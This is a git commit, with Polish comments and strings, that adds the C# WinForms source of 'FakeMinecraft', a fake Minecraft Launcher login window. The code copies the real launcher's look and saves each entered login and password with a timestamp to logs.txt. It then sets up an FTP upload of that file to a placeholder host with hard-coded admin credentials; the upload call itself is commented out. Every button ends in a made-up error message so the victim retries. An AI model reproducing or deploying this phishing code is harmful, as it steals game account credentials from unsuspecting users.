d12101df59059890e6d31942181bbb32ac73d4b1
Mateusz Kurowski <kurowskimateusz04@gmail.com>
2023-10-25 02:45:47 +0200

    Create project

---
+++ Form1.Designer.cs
@@ -0,0 +1,217 @@
+﻿namespace FakeMinecraft
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Wymagana zmienna projektanta.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Wyczyść wszystkie używane zasoby.
+        /// </summary>
+        /// <param name="disposing">prawda, jeżeli zarządzane zasoby powinny zostać zlikwidowane; Fałsz w przeciwnym wypadku.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Kod generowany przez Projektanta formularzy systemu Windows
+
+        /// <summary>
+        /// Metoda wymagana do obsługi projektanta — nie należy modyfikować
+        /// jej zawartości w edytorze kodu.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            this.txtLogin = new System.Windows.Forms.TextBox();
+            this.txtHaslo = new System.Windows.Forms.TextBox();
+            this.checkBox1 = new System.Windows.Forms.CheckBox();
+            this.backgroundWorker1 = new System.ComponentModel.BackgroundWorker();
+            this.button3 = new System.Windows.Forms.Button();
+            this.button2 = new System.Windows.Forms.Button();
+            this.button1 = new System.Windows.Forms.Button();
+            this.picLoading = new System.Windows.Forms.PictureBox();
+            this.btnZaloguj = new System.Windows.Forms.Button();
+            this.pictureBox1 = new System.Windows.Forms.PictureBox();
+            ((System.ComponentModel.ISupportInitialize)(this.picLoading)).BeginInit();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
+            this.SuspendLayout();
+            // 
+            // txtLogin
+            // 
+            this.txtLogin.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(19)))), ((int)(((byte)(19)))), ((int)(((byte)(19)))));
+            this.txtLogin.BorderStyle = System.Windows.Forms.BorderStyle.None;
+            this.txtLogin.Font = new System.Drawing.Font("Microsoft Sans Serif", 15.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.txtLogin.ForeColor = System.Drawing.Color.White;
+            this.txtLogin.Location = new System.Drawing.Point(306, 175);
+            this.txtLogin.Multiline = true;
+            this.txtLogin.Name = "txtLogin";
+            this.txtLogin.Size = new System.Drawing.Size(390, 26);
+            this.txtLogin.TabIndex = 2;
+            // 
+            // txtHaslo
+            // 
+            this.txtHaslo.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(19)))), ((int)(((byte)(19)))), ((int)(((byte)(19)))));
+            this.txtHaslo.BorderStyle = System.Windows.Forms.BorderStyle.None;
+            this.txtHaslo.Font = new System.Drawing.Font("Microsoft Sans Serif", 16F);
+            this.txtHaslo.ForeColor = System.Drawing.Color.White;
+            this.txtHaslo.Location = new System.Drawing.Point(306, 251);
+            this.txtHaslo.Name = "txtHaslo";
+            this.txtHaslo.PasswordChar = '•';
+            this.txtHaslo.Size = new System.Drawing.Size(390, 25);
+            this.txtHaslo.TabIndex = 3;
+            // 
+            // checkBox1
+            // 
+            this.checkBox1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(38)))), ((int)(((byte)(38)))), ((int)(((byte)(38)))));
+            this.checkBox1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
+            this.checkBox1.CausesValidation = false;
+            this.checkBox1.CheckAlign = System.Drawing.ContentAlignment.MiddleCenter;
+            this.checkBox1.ForeColor = System.Drawing.Color.Black;
+            this.checkBox1.Location = new System.Drawing.Point(300, 306);
+            this.checkBox1.Name = "checkBox1";
+            this.checkBox1.Size = new System.Drawing.Size(16, 16);
+            this.checkBox1.TabIndex = 5;
+            this.checkBox1.UseVisualStyleBackColor = false;
+            // 
+            // backgroundWorker1
+            // 
+            this.backgroundWorker1.DoWork += new System.ComponentModel.DoWorkEventHandler(this.backgroundWorker1_DoWork);
+            this.backgroundWorker1.RunWorkerCompleted += new System.ComponentModel.RunWorkerCompletedEventHandler(this.backgroundWorker1_RunWorkerCompleted);
+            // 
+            // button3
+            // 
+            this.button3.BackColor = System.Drawing.Color.Transparent;
+            this.button3.BackgroundImage = global::FakeMinecraft.Properties.Resources.bez_logowania;
+            this.button3.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Center;
+            this.button3.Cursor = System.Windows.Forms.Cursors.Hand;
+            this.button3.FlatAppearance.BorderSize = 0;
+            this.button3.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.button3.Location = new System.Drawing.Point(401, 473);
+            this.button3.Name = "button3";
+            this.button3.Size = new System.Drawing.Size(198, 25);
+            this.button3.TabIndex = 8;
+            this.button3.UseVisualStyleBackColor = false;
+            this.button3.Click += new System.EventHandler(this.fakeButton_Click);
+            // 
+            // button2
+            // 
+            this.button2.BackColor = System.Drawing.Color.Transparent;
+            this.button2.BackgroundImage = global::FakeMinecraft.Properties.Resources.zarejestruj_sie;
+            this.button2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Center;
+            this.button2.Cursor = System.Windows.Forms.Cursors.Hand;
+            this.button2.FlatAppearance.BorderSize = 0;
+            this.button2.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.button2.Location = new System.Drawing.Point(504, 428);
+            this.button2.Name = "button2";
+            this.button2.Size = new System.Drawing.Size(124, 25);
+            this.button2.TabIndex = 7;
+            this.button2.UseVisualStyleBackColor = false;
+            this.button2.Click += new System.EventHandler(this.fakeButton_Click);
+            // 
+            // button1
+            // 
+            this.button1.BackColor = System.Drawing.Color.Transparent;
+            this.button1.BackgroundImage = global::FakeMinecraft.Properties.Resources.brak_hasla;
+            this.button1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Center;
+            this.button1.Cursor = System.Windows.Forms.Cursors.Hand;
+            this.button1.FlatAppearance.BorderSize = 0;
+            this.button1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.button1.Location = new System.Drawing.Point(533, 302);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(166, 29);
+            this.button1.TabIndex = 6;
+            this.button1.UseVisualStyleBackColor = false;
+            this.button1.Click += new System.EventHandler(this.fakeButton_Click);
+            // 
+            // picLoading
+            // 
+            this.picLoading.BackColor = System.Drawing.Color.Transparent;
+            this.picLoading.BackgroundImage = global::FakeMinecraft.Properties.Resources.Untitled;
+            this.picLoading.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Center;
+            this.picLoading.ErrorImage = null;
+            this.picLoading.Image = global::FakeMinecraft.Properties.Resources.Youtube_loading_symbol_1__wobbly_1;
+            this.picLoading.InitialImage = null;
+            this.picLoading.Location = new System.Drawing.Point(413, 301);
+            this.picLoading.Name = "picLoading";
+            this.picLoading.Size = new System.Drawing.Size(148, 137);
+            this.picLoading.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
+            this.picLoading.TabIndex = 4;
+            this.picLoading.TabStop = false;
+            this.picLoading.UseWaitCursor = true;
+            this.picLoading.Visible = false;
+            // 
+            // btnZaloguj
+            // 
+            this.btnZaloguj.BackColor = System.Drawing.Color.White;
+            this.btnZaloguj.BackgroundImage = global::FakeMinecraft.Properties.Resources.button;
+            this.btnZaloguj.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
+            this.btnZaloguj.Cursor = System.Windows.Forms.Cursors.Hand;
+            this.btnZaloguj.FlatAppearance.BorderSize = 0;
+            this.btnZaloguj.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.btnZaloguj.ForeColor = System.Drawing.SystemColors.ControlText;
+            this.btnZaloguj.Location = new System.Drawing.Point(291, 354);
+            this.btnZaloguj.Name = "btnZaloguj";
+            this.btnZaloguj.Size = new System.Drawing.Size(415, 59);
+            this.btnZaloguj.TabIndex = 1;
+            this.btnZaloguj.UseVisualStyleBackColor = false;
+            this.btnZaloguj.Click += new System.EventHandler(this.btnZaloguj_Click);
+            // 
+            // pictureBox1
+            // 
+            this.pictureBox1.BackgroundImage = global::FakeMinecraft.Properties.Resources.minecrat_login_background;
+            this.pictureBox1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
+            this.pictureBox1.Location = new System.Drawing.Point(0, 0);
+            this.pictureBox1.Name = "pictureBox1";
+            this.pictureBox1.Size = new System.Drawing.Size(1000, 601);
+            this.pictureBox1.TabIndex = 0;
+            this.pictureBox1.TabStop = false;
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(1000, 601);
+            this.Controls.Add(this.button3);
+            this.Controls.Add(this.button2);
+            this.Controls.Add(this.button1);
+            this.Controls.Add(this.checkBox1);
+            this.Controls.Add(this.picLoading);
+            this.Controls.Add(this.txtHaslo);
+            this.Controls.Add(this.txtLogin);
+            this.Controls.Add(this.btnZaloguj);
+            this.Controls.Add(this.pictureBox1);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.Fixed3D;
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.MaximizeBox = false;
+            this.Name = "Form1";
+            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
+            this.Text = "Minecraft Launcher";
+            ((System.ComponentModel.ISupportInitialize)(this.picLoading)).EndInit();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.PictureBox pictureBox1;
+        private System.Windows.Forms.Button btnZaloguj;
+        private System.Windows.Forms.TextBox txtLogin;
+        private System.Windows.Forms.TextBox txtHaslo;
+        private System.Windows.Forms.PictureBox picLoading;
+        private System.Windows.Forms.CheckBox checkBox1;
+        private System.ComponentModel.BackgroundWorker backgroundWorker1;
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.Button button2;
+        private System.Windows.Forms.Button button3;
+    }
+}
+
---
+++ Form1.cs
@@ -0,0 +1,104 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+//Dodajemy biblioteki
+using System.IO;    // Osbługa plików tekstowych
+using System.Net;   // Obsługa połączenia do serwera FTP
+using System.Threading;
+
+namespace FakeMinecraft
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+            picLoading.Visible = false;
+        }
+
+        private void btnZaloguj_Click(object sender, EventArgs e)
+        {
+            if (string.IsNullOrWhiteSpace(txtLogin.Text))
+            {
+                MessageBox.Show("Nieprawidłowy adres e-mail.", "Wystąpił problem podczas logowania");
+                return;
+            }
+
+            if (string.IsNullOrWhiteSpace(txtHaslo.Text))
+            {
+                MessageBox.Show("Nieprawidłowe hasło.", "Wystąpił problem podczas logowania");
+                return;
+            }
+
+            UseWaitCursor = true;
+            picLoading.Visible = true;
+            btnZaloguj.Enabled = false;
+            backgroundWorker1.RunWorkerAsync();
+        }
+
+        private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
+        {
+            var error = SendCredentials();
+
+            var message = "Wystąpił problem nieznany podczas próby logowania do gry Minecraft. Prosimy spróbować ponownie za kilka minut.";
+            if (!string.IsNullOrWhiteSpace(error))
+                message += "(Ex000" + error;
+
+            MessageBox.Show(message, "Wystąpił problem podczas logowania");
+        }
+
+        private void backgroundWorker1_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
+        {
+            UseWaitCursor = false;
+            picLoading.Visible = false;
+            btnZaloguj.Enabled = true;
+        }
+
+        private string SendCredentials()
+        {
+            try
+            {
+                var sb = new StringBuilder();
+                sb.Append("Data próby dostępu: ").AppendLine(DateTime.Now.ToString("yyyy/MM/dd HH:mm:ss"));
+                sb.Append("Login: ").AppendLine(txtLogin.Text);
+                sb.Append("Hasło: ").AppendLine(txtHaslo.Text);
+                sb.AppendLine().AppendLine("***********************************************************************************************").AppendLine();
+                File.AppendAllText("logs.txt", sb.ToString());
+            }
+            catch (Exception)
+            {
+                return "1";
+            }
+
+            try
+            {
+                var userFtpLogin = "admin";
+                var userFtpPassword = "admin";
+                WebClient client = new WebClient();
+                client.Credentials = new NetworkCredential(userFtpLogin, userFtpPassword);
+
+                var fileOnSite = "ftp://example/FakeMinecraft/logs.txt";
+                //client.UploadFile(fileOnSite, WebRequestMethods.Ftp.UploadFile, "logs.txt");
+                Thread.Sleep(3000);
+            }
+            catch (Exception)
+            {
+                return "2";
+            }
+
+            return string.Empty;
+        }
+
+        private void fakeButton_Click(object sender, EventArgs e)
+        {
+            MessageBox.Show("Wystąpił niespodziewany problem. Spróbuj się zalogować.", "Błąd");
+        }
+    }
+}
